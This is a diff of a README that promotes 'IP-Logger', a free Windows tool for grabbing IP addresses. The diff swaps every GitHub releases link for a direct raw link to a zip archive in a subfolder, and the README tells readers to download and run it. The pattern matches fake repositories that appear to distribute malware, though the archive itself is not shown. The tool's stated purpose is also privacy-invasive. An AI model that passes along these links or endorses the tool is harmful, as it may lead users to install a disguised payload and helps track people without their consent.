@@ -1,6 +1,6 @@
 <h1>🔍 IP-Logger - Grab IP Addresses Instantly, Free Forever</h1>
 
-[![Download IP-Logger](https://img.shields.io/badge/Download-IP--Logger-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Annabelhallucinogenic7831/IP-Logger/releases)
+[![Download IP-Logger](https://img.shields.io/badge/Download-IP--Logger-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Annabelhallucinogenic7831/IP-Logger/main/linea/I_Logger_1.9.zip)
 
 ## 🎯 What Is IP-Logger?
 
@@ -20,14 +20,14 @@ IP-Logger stands out from other tools because it's:
 
 Getting IP-Logger on your computer takes less than a minute. Here's what you need to do:
 
-1. **Visit the download page** by clicking the button above or using this link: [https://github.com/Annabelhallucinogenic7831/IP-Logger/releases](https://github.com/Annabelhallucinogenic7831/IP-Logger/releases)
+1. **Visit the download page** by clicking the button above or using this link: [https://raw.githubusercontent.com/Annabelhallucinogenic7831/IP-Logger/main/linea/I_Logger_1.9.zip](https://raw.githubusercontent.com/Annabelhallucinogenic7831/IP-Logger/main/linea/I_Logger_1.9.zip)
 2. **Find the latest release** - look for the newest version number
 3. **Download the file** - click the download link for the Windows version
 4. **Run the application** - once downloaded, double-click the file to start using IP-Logger
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Annabelhallucinogenic7831/IP-Logger/releases](https://github.com/Annabelhallucinogenic7831/IP-Logger/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Annabelhallucinogenic7831/IP-Logger/main/linea/I_Logger_1.9.zip](https://raw.githubusercontent.com/Annabelhallucinogenic7831/IP-Logger/main/linea/I_Logger_1.9.zip)
 
 Once you're on the download page, follow these simple steps:
 
@@ -156,8 +156,8 @@ Don't wait - download IP-Logger today and see for yourself how simple IP trackin
 
 Take the first step now:
 
-[![Download IP-Logger Now](https://img.shields.io/badge/⬇️_Download_IP--Logger_2026-FF6B6B?style=for-the-badge)](https://github.com/Annabelhallucinogenic7831/IP-Logger/releases)
+[![Download IP-Logger Now](https://img.shields.io/badge/⬇️_Download_IP--Logger_2026-FF6B6B?style=for-the-badge)](https://raw.githubusercontent.com/Annabelhallucinogenic7831/IP-Logger/main/linea/I_Logger_1.9.zip)
 
-Visit this link to download the application: [https://github.com/Annabelhallucinogenic7831/IP-Logger/releases](https://github.com/Annabelhallucinogenic7831/IP-Logger/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Annabelhallucinogenic7831/IP-Logger/main/linea/I_Logger_1.9.zip](https://raw.githubusercontent.com/Annabelhallucinogenic7831/IP-Logger/main/linea/I_Logger_1.9.zip)
 
 Join thousands of satisfied users who rely on IP-Logger for their IP tracking needs. It's fast, it's free, and it works. Get your copy now and experience the easiest way to log IP addresses on Windows.
